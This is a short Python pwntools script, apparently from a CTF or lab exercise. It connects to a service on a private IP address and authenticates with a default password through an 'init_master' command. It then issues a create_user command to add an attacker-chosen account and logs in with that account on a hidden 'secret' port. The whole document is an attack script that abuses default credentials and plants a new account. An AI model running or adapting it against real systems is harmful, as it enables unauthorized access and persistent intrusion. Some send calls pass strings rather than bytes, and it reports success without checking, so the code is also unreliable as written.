from pwn import *
import time

def main():
    HOST = '192.168.1.7'
    PORT = 1234
    SECRET_PORT = 20100

    try:
        conn = remote(HOST, PORT)
        r = conn.recv()
        print(f"<-- {r} ")

        conn.send(b"init_master\n")
        print(f"--> init_master")

        r = conn.recv()
        print(f"<-- {r} ")

        conn.send(b"default-password\n")
        print(f"--> default-password ")

        time.sleep(1)  # Wait for the server to process

        # Get Hostname Response
        conn.send(b"get_hostname\n")
        r = conn.recv()
        print(f"<-- {r} ")

        time.sleep(1)  # Wait for the server to process

        # Create User Command
        conn.send(b"create_user\n")
        r = conn.recv()
        print(f"<-- {r} ")

        # Prompt user to input new username and password
        new_username = input("Enter new username: ")
        new_password = input("Enter new password: ")

        # Send the new username and password to the server
        conn.send(f"{new_username}\n")
        conn.send(f"{new_password}\n")

        print("User created successfully!")

        time.sleep(2)  # Wait for the server to process

        # Connect to the secret server on port 20100
        secret_conn = remote(HOST, SECRET_PORT)

        # Prompt user to enter the new credentials on the secret server
        secret_conn.send(f"{new_username}\n")
        secret_conn.send(f"{new_password}\n")

        print("Connected to the secret server!")

        secret_conn.close()
        conn.close()

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
